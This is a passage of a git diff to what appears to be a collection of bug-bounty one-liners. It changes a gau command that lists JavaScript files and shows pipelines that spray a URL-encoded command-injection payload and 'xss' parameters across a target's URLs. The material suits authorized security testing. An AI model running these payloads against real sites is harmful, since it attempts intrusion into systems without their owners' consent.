@@ -202,7 +202,7 @@ subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x”
 ## JS Files:
 ### Find JS Files:
 ```
-gau -subs target.com |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
+gau --subs target.com |grep -iE '.js'|grep -iEv '(.jsp|.json)' >> js.txt
 ```
 ```
 assetfinder target.com | waybackurls | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
